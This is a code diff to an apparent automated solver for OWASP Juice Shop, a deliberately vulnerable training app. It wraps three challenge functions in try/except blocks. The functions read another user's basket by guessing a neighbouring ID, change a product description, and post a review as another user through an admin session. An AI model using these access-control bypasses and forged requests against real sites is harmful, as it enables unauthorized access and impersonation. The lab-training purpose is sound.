@@ -28,17 +28,20 @@ def access_another_user_basket(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    print("Access another user basket...", end="")
-    myid = get_current_user_id(server, session)
-    if myid is 1:
-        targetid = myid + 1
-    else:
-        targetid = myid - 1
-    basket = session.get('{}/{}'.format(_get_basket_url(server), targetid))
-    if not basket.ok:
-        print('Error accessing basket {}'.format(targetid))
-    else:
-        print('Success.')
+    try:
+      print("Access another user basket...", end="")
+      myid = get_current_user_id(server, session)
+      if myid is 1:
+          targetid = myid + 1
+      else:
+          targetid = myid - 1
+      basket = session.get('{}/{}'.format(_get_basket_url(server), targetid))
+      if not basket.ok:
+          print('Error accessing basket {}'.format(targetid))
+      else:
+          print('Success.')
+    except:
+      print('Failed!')
 
 
 def order_christmas_special(server, session):
@@ -81,13 +84,16 @@ def update_osaft_description(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    print('Updating O-Saft description with new URL...', end=""),
-    origurl = 'http://kimminich.de'
-    newurl = 'https://owasp.slack.com'
-    osaft = search_products(server, session, searchterm='O-Saft')[0]
-    description = osaft.get('description').replace(origurl, newurl)
-    _update_description(server, session, productid=osaft.get('id'), description=description)
-    print('Success.')
+    try:
+      print('Updating O-Saft description with new URL...', end=""),
+      origurl = 'http://kimminich.de'
+      newurl = 'https://owasp.slack.com'
+      osaft = search_products(server, session, searchterm='O-Saft')[0]
+      description = osaft.get('description').replace(origurl, newurl)
+      _update_description(server, session, productid=osaft.get('id'), description=description)
+      print('Success.')
+    except:
+      print('Failed!')
 
 
 def update_product_with_xss3_payload(server, session):
@@ -173,13 +179,16 @@ def forged_review_challenge(server, session):
     :param server: juice shop URL
     :param session: Session
     """
-    print('Posting a product review as another user....'),
-    session = get_admin_session(server)
-    payload = json.dumps({"message":"This may be the end of the banana daiquiri as we know it!","author":"bender@juice-sh.op"})
-    review = session.put('{}/rest/products/6/reviews'.format(server), payload)
-    if not review.ok:
-        print('Error checking out basket.')
-    print('Success.')
+    try:
+      print('Posting a product review as another user....'),
+      session = get_admin_session(server)
+      payload = json.dumps({"message":"This may be the end of the banana daiquiri as we know it!","author":"bender@juice-sh.op"})
+      review = session.put('{}/rest/products/6/reviews'.format(server), payload)
+      if not review.ok:
+          print('Error checking out basket.')
+      print('Success.')
+    except:
+      print('Failed!')
         
 
 
